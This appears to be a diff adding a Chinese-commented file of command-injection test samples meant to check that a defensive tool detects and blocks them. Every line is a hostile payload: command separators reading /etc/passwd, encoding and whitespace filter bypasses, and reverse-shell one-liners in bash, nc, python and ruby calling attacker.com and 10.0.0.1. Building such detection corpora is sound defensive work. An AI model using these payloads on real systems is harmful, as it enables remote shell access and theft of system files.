@@ -1,0 +1,48 @@
+# 命令注入攻击样本
+# 期望: 防御工具应能检测并拦截包含系统命令执行特征的输入
+
+# ---- 基础命令分隔符 ----
+; cat /etc/passwd
+; whoami
+; id
+| whoami
+|| whoami
+&& whoami
+`whoami`
+$(whoami)
+
+# ---- 编码绕过 ----
+%3B%20cat%20%2Fetc%2Fpasswd
+%7C%20whoami
+%26%26%20id
+
+# ---- 空字节截断 ----
+file.txt%00|whoami
+image.jpg\x00;nc -e /bin/sh attacker.com 4444
+
+# ---- 反引号与 $() ----
+`nc -e /bin/sh attacker.com 4444`
+$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
+$(python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])')
+
+# ---- 空格绕过 ----
+cat${IFS}/etc/passwd
+cat$IFS$9/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+
+# ---- 路径遍历 + 命令注入 ----
+../../../etc/passwd; whoami
+../../../bin/bash -c "cat /etc/passwd"
+
+# ---- 利用环境变量 ----
+${PATH:0:1}etc${PATH:0:1}passwd
+`echo${IFS}cGF0aA==|base64${IFS}-d`
+
+# ---- 常用反弹 shell ----
+; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+; nc -e /bin/sh 10.0.0.1 4444
+; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
